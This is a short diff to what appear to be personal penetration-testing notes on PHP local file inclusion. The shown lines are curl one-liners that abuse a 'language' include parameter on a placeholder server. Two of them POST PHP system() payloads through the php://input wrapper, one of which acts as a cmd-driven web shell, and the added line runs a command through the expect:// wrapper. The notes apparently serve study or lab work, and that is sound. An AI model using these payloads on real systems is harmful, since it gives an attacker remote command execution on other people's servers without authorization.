@@ -44,3 +44,4 @@ run cmd in url:
     -s silent
   curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
   curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" | grep uid
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
